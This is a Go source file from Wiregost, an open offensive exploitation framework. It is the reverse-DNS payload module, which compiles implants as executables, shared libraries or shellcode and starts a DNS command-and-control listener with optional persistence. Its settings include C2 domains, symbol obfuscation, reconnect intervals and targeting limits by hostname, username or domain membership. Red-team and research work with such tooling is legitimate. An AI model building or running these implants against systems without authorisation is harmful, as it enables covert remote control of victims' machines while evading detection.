// Wiregost - Golang Exploitation Framework
// Copyright © 2020 Para
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <http://www.gnu.org/licenses/>.

package reverse_dns

import (
	"errors"
	"fmt"
	"strconv"
	"strings"

	"github.com/evilsocket/islazy/tui"

	consts "github.com/maxlandon/wiregost/client/constants"
	"github.com/maxlandon/wiregost/data-service/remote"
	pb "github.com/maxlandon/wiregost/protobuf/client"
	"github.com/maxlandon/wiregost/server/c2"
	"github.com/maxlandon/wiregost/server/core"
	"github.com/maxlandon/wiregost/server/generate"
	"github.com/maxlandon/wiregost/server/log"
	"github.com/maxlandon/wiregost/server/module"
)

// [ Base Methods ] ------------------------------------------------------------------------//

// ReverseDNS - A single stage DNS implant
type ReverseDNS struct {
	*module.Module
}

// New - Instantiates a reverse DNS module, empty.
func New() *ReverseDNS {
	mod := &ReverseDNS{&module.Module{}}
	mod.Path = []string{"payload/multi/single/reverse_dns"}
	return mod
}

var modLog = log.ServerLogger("payload/multi/single/reverse_dns", "module")

// [ Module Methods ] ------------------------------------------------------------------------//

// Run - Module entrypoint. ** DO NOT ERASE **
func (s *ReverseDNS) Run(command string) (result string, err error) {

	action := strings.Split(command, " ")[0]

	switch action {
	case consts.ModuleRun:
		return s.CompileImplant()
	case consts.ModuleToListener:
		return s.toListener()
	case consts.ModuleParseProfile:
		return s.parseProfile(command)
	case consts.ModuleToProfile:
		return s.generateProfile(command)
	}

	return "Reverse DNS listener started", nil
}

func (s *ReverseDNS) CompileImplant() (result string, err error) {
	c, err := s.ToGhostConfig()
	if err != nil {
		return "", err
	}

	go generate.CompileGhost(*c)

	return fmt.Sprintf("Started compiling DNS implant"), nil
}

func (s *ReverseDNS) toListener() (result string, err error) {
	// Listener domains
	domains := strings.Split(s.Options["ListenerDomains"].Value, ",")
	if (len(domains) == 1) && (domains[0] == "") {
		return "", errors.New("No domains provided for DNS listener")
	}
	for _, domain := range domains {
		if !strings.HasSuffix(domain, ".") {
			domain += "."
		}
	}

	// Implant canaries
	enableCanaries := true
	if s.Options["DisableCanaries"].Value == "true" {
		enableCanaries = false
	}

	// Persistence
	persist := ""
	if s.Options["Persist"].Value == "true" {
		persist = fmt.Sprintf("%s[P]%s ", tui.GREEN, tui.RESET)
	}
	server := c2.StartDNSListener(domains, enableCanaries)
	description := fmt.Sprintf("%s%s (canaries %v)", persist, strings.Join(domains, " "), enableCanaries)

	job := &core.Job{
		ID:          core.GetJobID(),
		Name:        "DNS",
		Description: description,
		Protocol:    "udp",
		Port:        53,
		JobCtrl:     make(chan bool),
	}

	// Save persist
	if s.Options["Persist"].Value == "true" {
		err := c2.PersistDNS(job, enableCanaries, domains)
		if err != nil {
			s.Event("Error saving persistence: " + err.Error())
		}
	}

	go func() {
		<-job.JobCtrl
		modLog.Infof("Stopping DNS listener (%d) ...", job.ID)
		server.Shutdown()

		core.Jobs.RemoveJob(job)

		core.EventBroker.Publish(core.Event{
			Job:       job,
			EventType: consts.StoppedEvent,
		})
	}()

	core.Jobs.AddJob(job)

	// There is no way to call DNS's ListenAndServe() without blocking
	// but we also need to check the error in the case the server
	// fails to start at all, so we setup all the Job mechanics
	// then kick off the server and if it fails we kill the job
	// ourselves.
	go func() {
		err := server.ListenAndServe()
		if err != nil {
			modLog.Errorf("DNS listener error %v", err)
			job.JobCtrl <- true
		}
	}()

	return fmt.Sprintf("Reverse DNS listener started with parent domain(s) %v...", domains), nil
}

func (s *ReverseDNS) parseProfile(name string) (result string, err error) {
	profileName := strings.Split(name, " ")[1]

	profile, err := generate.ProfileByName(profileName)
	if err != nil {
		return "", err
	}

	// C2
	if profile.DNSc2Enabled {
		urls := []string{}
		for _, d := range profile.C2 {
			if strings.HasPrefix(d.URL, "dns") {
				url := strings.TrimPrefix(d.URL, "dns://")
				urls = append(urls, url)
			}
		}
		s.Options["DomainsDNS"].Value = strings.Join(urls, ",")
	}

	// Canaries
	if len(profile.CanaryDomains) != 1 {
		domains := []string{}
		for _, d := range profile.CanaryDomains {
			domains = append(domains, d)
		}
		s.Options["Canaries"].Value = strings.Join(domains, ",")
	}

	// Format
	switch profile.Format {
	case 0:
		s.Options["Format"].Value = "shared"
	case 1:
		s.Options["Format"].Value = "shellcode"
	case 2:
		s.Options["Format"].Value = "exe"
	}

	// Other fields
	s.Options["Arch"].Value = profile.GOARCH
	s.Options["OS"].Value = profile.GOOS
	s.Options["MaxErrors"].Value = strconv.Itoa(profile.MaxConnectionErrors)
	s.Options["ObfuscateSymbols"].Value = strconv.FormatBool(profile.ObfuscateSymbols)
	s.Options["Debug"].Value = strconv.FormatBool(profile.Debug)
	s.Options["LimitHostname"].Value = profile.LimitHostname
	s.Options["LimitUsername"].Value = profile.LimitUsername
	s.Options["LimitDatetime"].Value = profile.LimitDatetime
	s.Options["LimitDomainJoined"].Value = strconv.FormatBool(profile.LimitDomainJoined)
	s.Options["ReconnectInterval"].Value = strconv.Itoa(profile.ReconnectInterval)

	return fmt.Sprintf("Profile %s parsed", profile.Name), nil
}

func (s *ReverseDNS) generateProfile(name string) (result string, err error) {
	profileName := strings.Split(name, " ")[1]

	c, err := s.ToGhostConfig()
	if err != nil {
		return "", err
	}

	// Save profile
	c.Name = profileName
	if 0 < len(c.Name) && c.Name != "." {
		modLog.Infof("Saving new profile with name %#v", c.Name)
		err = generate.ProfileSave(c.Name, c)
	} else {
		err = errors.New("Invalid profile name")
		return "", err
	}

	return fmt.Sprintf("Saved reverse DNS implant profile with name %#v", c.Name), nil
}

func (s *ReverseDNS) ToGhostConfig() (c *generate.GhostConfig, err error) {
	c = &generate.GhostConfig{}

	// OS
	targetOS := s.Options["OS"].Value
	if targetOS == "mac" || targetOS == "macos" || targetOS == "m" || targetOS == "osx" {
		targetOS = "darwin"
	}
	if targetOS == "win" || targetOS == "w" || targetOS == "shit" {
		targetOS = "windows"
	}
	if targetOS == "unix" || targetOS == "l" {
		targetOS = "linux"
	}

	// Arch
	arch := s.Options["Arch"].Value
	if arch == "x64" || strings.HasPrefix(arch, "64") {
		arch = "amd64"
	}
	if arch == "x86" || strings.HasPrefix(arch, "32") {
		arch = "386"
	}

	// Format
	var outputFormat pb.GhostConfig_OutputFormat
	format := s.Options["Format"].Value
	switch format {
	case "shared":
		outputFormat = pb.GhostConfig_SHARED_LIB
		c.IsSharedLib = true
	case "shellcode":
		outputFormat = pb.GhostConfig_SHELLCODE
		c.IsSharedLib = true
	case "exe":
		outputFormat = pb.GhostConfig_EXECUTABLE
		c.IsSharedLib = false
	default:
		outputFormat = pb.GhostConfig_EXECUTABLE
		c.IsSharedLib = false
	}

	// DNS C2
	c2s := generate.ParseDNSc2(s.Options["DomainsDNS"].Value)
	if len(c2s) == 0 {
		return nil, errors.New("You must specify at least one DNS C2 endpoint")
	}

	// Canary Domains
	canaries := strings.Split(s.Options["Canaries"].Value, ",")
	if canaries[0] != "" {
		c.CanaryDomains = strings.Split(s.Options["Canaries"].Value, ",")
	}

	// Populate fields
	c.GOOS = targetOS
	c.GOARCH = arch
	c.Format = outputFormat
	c.C2 = c2s
	c.DNSc2Enabled = true
	c.Debug, _ = strconv.ParseBool(s.Options["Debug"].Value)
	c.ObfuscateSymbols, _ = strconv.ParseBool(s.Options["ObfuscateSymbols"].Value)
	c.MaxConnectionErrors, _ = strconv.Atoi(s.Options["MaxErrors"].Value)
	c.ReconnectInterval, _ = strconv.Atoi(s.Options["ReconnectInterval"].Value)
	c.LimitDomainJoined, _ = strconv.ParseBool(s.Options["LimitDomainJoined"].Value)
	c.LimitHostname = s.Options["LimitHostname"].Value
	c.LimitUsername = s.Options["LimitUsername"].Value
	c.LimitDatetime = s.Options["LimitDatetime"].Value

	// Workspace
	if s.Options["Workspace"].Value != "" {
		workspace := ""
		workspaces, _ := remote.Workspaces(nil)
		for _, w := range workspaces {
			if w.Name == s.Options["Workspace"].Value {
				workspace = w.Name
				c.WorkspaceID = w.ID
			}
		}
		if workspace == "" {
			return nil, fmt.Errorf("Invalid workspace: %s", s.Options["Workspace"].Value)
		}
	}

	return c, nil
}
